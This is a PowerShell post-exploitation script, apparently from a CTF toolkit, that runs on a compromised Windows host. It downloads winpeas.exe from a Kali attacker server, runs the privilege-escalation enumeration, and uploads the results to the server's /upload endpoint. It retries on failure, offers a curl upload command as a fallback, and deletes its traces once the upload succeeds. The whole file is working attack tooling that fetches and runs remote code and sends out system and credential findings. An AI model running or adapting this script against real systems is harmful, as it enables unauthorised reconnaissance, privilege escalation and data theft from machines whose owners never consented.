# ParsingPeas Wrapper Script (PowerShell)
# Runs winpeas and automatically sends output to Kali host
# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
# Compatible with PowerShell 2.0+ and non-interactive shells

# Server URL will be replaced by receiver.py
$ServerUrl = "KALI_SERVER_URL"

$ErrorActionPreference = "Stop"

# Detect if running in interactive console
$IsInteractive = $true
try {
    $ConsoleHost = [Console]::WindowHeight
    if ($ConsoleHost -eq 0) { $IsInteractive = $false }
} catch {
    $IsInteractive = $false
}

# Output function that works in both interactive and non-interactive shells
function Write-Output-Safe {
    param([string]$Message)
    if ($IsInteractive) {
        Write-Host $Message
    } else {
        Write-Output $Message
    }
}

function Write-Output-Color {
    param([string]$Message, [string]$Color = "White")
    if ($IsInteractive) {
        Write-Host $Message -ForegroundColor $Color
    } else {
        Write-Output $Message
    }
}

$SessionId = "scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$PID"
$Hostname = $env:COMPUTERNAME
if (-not $Hostname) { $Hostname = "unknown" }
$TmpOutput = "$env:TEMP\.winpeas_$(Get-Date -Format 'yyyyMMdd_HHmmss').tmp"

Write-Output-Color "[*] ParsingPeas - Automated Privilege Escalation Scanner" "Cyan"
Write-Output-Color "[*] Session ID: $SessionId" "Cyan"
Write-Output-Color "[*] Hostname: $Hostname" "Cyan"
Write-Output-Color "[*] Server: $ServerUrl" "Cyan"
Write-Output-Safe ""

$ScanType = "winpeas"
$Incomplete = $false
Write-Output-Color "[*] Detected: Windows system" "Yellow"
$ScriptEndpoint = "$ServerUrl/get-winpeas"
$ScriptPath = "$env:TEMP\winpeas.exe"

Write-Output-Color "[*] Downloading $ScanType from Kali host..." "Yellow"

# Download script from Kali host using WebClient (PowerShell 2.0+ compatible)
try {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($ScriptEndpoint, $ScriptPath)
    $WebClient.Dispose()
} catch {
    Write-Output-Color "[!] Download failed: $_" "Red"
    exit 1
}

if (-not (Test-Path $ScriptPath) -or (Get-Item $ScriptPath).Length -eq 0) {
    Write-Output-Color "[!] Error: Script download failed or empty" "Red"
    exit 1
}

Write-Output-Color "[+] Downloaded successfully" "Green"

Write-Output-Color "[*] Running winpeas (this may take 2-5 minutes)..." "Yellow"
Write-Output-Color "[*] Winpeas may appear stuck for 30-60s during initial enumeration" "Yellow"
Write-Output-Color "[*] Output is being saved to file..." "Yellow"
Write-Output-Safe ""

# Create empty file for real-time writing
[System.IO.File]::WriteAllText($TmpOutput, "")

# Create stream writer for real-time file writing
$FileStream = [System.IO.File]::Open($TmpOutput, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
$StreamWriter = New-Object System.IO.StreamWriter($FileStream)
$StreamWriter.AutoFlush = $true

# Run winpeas and capture output with real-time file writing
try {
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName = $ScriptPath
    $ProcessInfo.RedirectStandardOutput = $true
    $ProcessInfo.RedirectStandardError = $true
    $ProcessInfo.UseShellExecute = $false
    $ProcessInfo.CreateNoWindow = $true
    
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo = $ProcessInfo
    
    $Process.Start() | Out-Null
    Write-Output-Color "[*] Winpeas running (PID: $($Process.Id))..." "Yellow"
    
    # Synchronous stdout capture.
    #
    # This used to use Register-ObjectEvent -EventName OutputDataReceived -Action.
    # -Action handlers are dispatched on the PowerShell pipeline thread and only
    # sustain ~18 lines/s, while winpeas emits ~90 lines/s (~3,300 lines in ~38 s).
    # PowerShell's event queue is lossy, so ~79% of the report (Processes, Services,
    # Applications, Network, AD, Windows Credentials, Browsers, Interesting files...)
    # never reached the file, and the truncation was reported as a success.
    # Draining StandardOutput synchronously is lossless and just as fast.
    $StartTime = Get-Date
    $LastUpdate = $StartTime
    $LastSize = 0
    $StuckCount = 0
    $LineCount = 0
    $Output = $Process.StandardOutput

    while (-not $Output.EndOfStream) {
        $Line = $Output.ReadLine()
        if ($null -ne $Line) {
            $StreamWriter.WriteLine($Line)
            $LineCount++
        }

        $Now = Get-Date
        if (($Now - $LastUpdate).TotalMilliseconds -lt 500) { continue }

        # Get current file size (actual bytes on disk)
        $CurrentSize = 0
        if (Test-Path $TmpOutput) {
            try {
                $FileInfo = Get-Item $TmpOutput
                $CurrentSize = $FileInfo.Length
            } catch {
                # File might be locked, use last known size
                $CurrentSize = $LastSize
            }
        }
        $CurrentKB = [Math]::Round($CurrentSize / 1KB, 1)
        $Elapsed = [Math]::Round(($Now - $StartTime).TotalSeconds)

        # Detect if stuck (no progress)
        if ($CurrentSize -eq $LastSize) {
            $StuckCount++
        } else {
            $StuckCount = 0
        }

        # Non-interactive mode: periodic text updates
        if (-not $IsInteractive) {
            if (($Now - $LastUpdate).TotalSeconds -ge 10) {
                if ($StuckCount -ge 20) {
                    Write-Output "[*] Running... $Elapsed sec | Output: $CurrentKB KB (enumeration in progress)"
                } else {
                    Write-Output "[*] Running... $Elapsed sec | Output: $CurrentKB KB"
                }
            }
        } else {
            # Interactive mode: live display
            $Minutes = [Math]::Floor($Elapsed / 60)
            $Seconds = $Elapsed % 60
            if ($StuckCount -ge 20) {
                Write-Host "`r[*] Running: $Minutes`:$($Seconds.ToString('00')) | Output: $CurrentKB KB (enumerating...)" -NoNewline -ForegroundColor Yellow
            } else {
                Write-Host "`r[*] Running: $Minutes`:$($Seconds.ToString('00')) | Output: $CurrentKB KB" -NoNewline -ForegroundColor Cyan
            }
        }

        $LastSize = $CurrentSize
        $LastUpdate = $Now
    }

    # EOF on stdout: winpeas is done. Collect exit code and stderr.
    # (winpeas writes almost nothing to stderr, so draining it after stdout
    #  cannot deadlock on a full 4 KB stderr buffer.)
    $Process.WaitForExit()
    $ExitCode = $Process.ExitCode
    $StderrText = ""
    try {
        $StderrText = $Process.StandardError.ReadToEnd()
    } catch {
        $StderrText = ""
    }

    # Close stream writer
    $StreamWriter.Close()
    $StreamWriter.Dispose()
    $FileStream.Close()
    $FileStream.Dispose()

    # Get final size
    $FinalSize = 0
    if (Test-Path $TmpOutput) {
        $FinalSize = (Get-Item $TmpOutput).Length
    }
    $FinalKB = [Math]::Round($FinalSize / 1KB, 1)

    # Verify the capture is complete: winpeas always ends with its "Thank you!"
    # credit box, a truncated capture never reaches it.
    $CaptureComplete = $false
    try {
        $CapturedText = [System.IO.File]::ReadAllText($TmpOutput)
        if ($CapturedText.Length -gt 0) {
            $TailStart = [Math]::Max(0, $CapturedText.Length - 3000)
            $TailText = $CapturedText.Substring($TailStart)
            if ($TailText -match 'Thank you!' -and $LineCount -gt 1000) {
                $CaptureComplete = $true
            }
        }
    } catch {
        $CaptureComplete = $false
    }

    if (-not $CaptureComplete) {
        $ScanType = "winpeas_partial"
        $Incomplete = $true
        Write-Output-Color "[!] WARNING: winpeas output looks INCOMPLETE ($LineCount lines, $FinalKB KB, no end banner)." "Red"
        Write-Output-Color "[!] Uploading as scan type 'winpeas_partial' so it is not mistaken for a full scan." "Red"
    } else {
        Write-Output-Color "[+] Capture complete: $LineCount lines, $FinalKB KB (end banner found)." "Green"
    }
    
    if ($IsInteractive) {
        Write-Host "`r[+] Complete! | Output: $FinalKB KB                                    " -ForegroundColor Green
    }
    Write-Output-Safe ""
    Write-Output-Safe ""
    
    # Append errors to file if any
    $ErrorOutput = $StderrText
    if ($ErrorOutput) {
        [System.IO.File]::AppendAllText($TmpOutput, "`n`n=== STDERR ===`n" + $ErrorOutput)
    }
    
    Write-Output-Color "[+] Winpeas completed with exit code: $ExitCode" "Green"
    
} catch {
    Write-Output-Color "[!] Error running winpeas: $_" "Red"
    Write-Output-Color "[!] Exception: $($_.Exception.Message)" "Red"
    # Clean up streams if they exist
    try {
        if ($StreamWriter) { $StreamWriter.Dispose() }
        if ($FileStream) { $FileStream.Dispose() }
    } catch {}
    exit 1
}

# Check if output was generated
if (-not (Test-Path $TmpOutput) -or (Get-Item $TmpOutput).Length -eq 0) {
    Write-Output-Color "[!] Error: No output generated" "Red"
    exit 1
}

$OutputSize = (Get-Item $TmpOutput).Length
Write-Output-Color "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" "Green"

# Calculate MD5 checksum for verification
Write-Output-Safe ""
Write-Output-Color "[*] Calculating checksum..." "Yellow"
try {
    $MD5 = New-Object System.Security.Cryptography.MD5CryptoServiceProvider
    $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
    $Hash = $MD5.ComputeHash($FileBytes)
    $Checksum = [BitConverter]::ToString($Hash).Replace("-", "").ToLower()
    Write-Output-Color "[+] MD5 Checksum: $Checksum" "Green"
} catch {
    Write-Output-Color "[!] Warning: Could not calculate checksum" "Yellow"
    $Checksum = "unknown"
}

Write-Output-Safe ""
Write-Output-Color "[*] Output saved, preparing upload..." "Yellow"
Write-Output-Safe ""

# Test connection before upload
Write-Output-Color "[*] Testing connection to Kali host..." "Yellow"
try {
    $TestClient = New-Object System.Net.WebClient
    $TestResponse = $TestClient.DownloadString("$ServerUrl/health")
    $TestClient.Dispose()
    Write-Output-Color "[+] Connection test successful" "Green"
} catch {
    Write-Output-Color "[!] Warning: Cannot reach server at $ServerUrl" "Yellow"
    Write-Output-Color "[*] Will attempt upload anyway..." "Yellow"
}

Write-Output-Color "[*] Transferring to Kali host..." "Yellow"
Write-Output-Color "[*] Upload endpoint: $ServerUrl/upload" "Cyan"
Write-Output-Color "[*] File to upload: $([Math]::Round($OutputSize / 1KB, 2)) KB" "Cyan"
Write-Output-Safe ""

# Send to Kali with retry logic
$MaxRetries = 3
$RetryCount = 0
$Success = $false

while ($RetryCount -lt $MaxRetries -and -not $Success) {
    Write-Output-Color "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" "Yellow"
    
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("X-Session-ID", $SessionId)
        $WebClient.Headers.Add("X-Hostname", $Hostname)
        $WebClient.Headers.Add("X-Scan-Type", $ScanType)
        $WebClient.Headers.Add("X-Client-Checksum", $Checksum)
        $WebClient.Headers.Add("Content-Type", "text/plain")
        
        Write-Output-Color "[*] Reading file bytes..." "Cyan"
        $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
        Write-Output-Color "[+] Read $($FileBytes.Length) bytes" "Green"
        
        Write-Output-Color "[*] Uploading to $ServerUrl/upload ..." "Cyan"
        
        $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
        $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
        
        Write-Output-Color "[+] Upload complete!" "Green"
        Write-Output-Color "[+] Transfer successful!" "Green"
        
        # Try to extract report URL and checksum from response
        try {
            if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
                $ReportUrl = $matches[1]
                Write-Output-Color "[+] View report at: $ServerUrl$ReportUrl" "Green"
            }
            if ($ResponseText -match '"checksum"\s*:\s*"([^"]+)"') {
                $ServerChecksum = $matches[1]
                if ($ServerChecksum -eq $Checksum) {
                    Write-Output-Color "[+] Checksum verified: Match!" "Green"
                } else {
                    Write-Output-Color "[!] Checksum mismatch! Client: $Checksum | Server: $ServerChecksum" "Red"
                }
            }
        } catch {
            # Ignore parse errors
        }
        
        $WebClient.Dispose()
        $Success = $true
        
    } catch {
        $RetryCount++
        Write-Output-Color "[!] Transfer failed" "Red"
        Write-Output-Color "[!] Error: $_" "Red"
        Write-Output-Color "[!] Exception: $($_.Exception.Message)" "Red"
        if ($_.Exception.InnerException) {
            Write-Output-Color "[!] Inner Exception: $($_.Exception.InnerException.Message)" "Red"
        }
        
        if ($RetryCount -lt $MaxRetries) {
            Write-Output-Color "[*] Retrying in 2 seconds..." "Yellow"
            Start-Sleep -Seconds 2
        }
    }
}

Write-Output-Safe ""
if ($Success) {
    Write-Output-Color "[+] Cleaning up..." "Green"
    Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $TmpOutput -Force -ErrorAction SilentlyContinue
    if ($Incomplete) {
        Write-Output-Color "[!] Done, but the capture was INCOMPLETE - the report is truncated." "Red"
        exit 2
    }
    Write-Output-Color "[+] Done!" "Green"
    exit 0
} else {
    Write-Output-Color "[!] Transfer failed after $MaxRetries attempts" "Red"
    Write-Output-Color "[*] Output saved locally at: $TmpOutput" "Yellow"
    Write-Output-Color "[*] MD5 Checksum: $Checksum" "Yellow"
    Write-Output-Color "[*] You can manually upload with curl:" "Yellow"
    Write-Output-Color "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' -H 'X-Client-Checksum: $Checksum' $ServerUrl/upload" "Yellow"
    exit 1
}
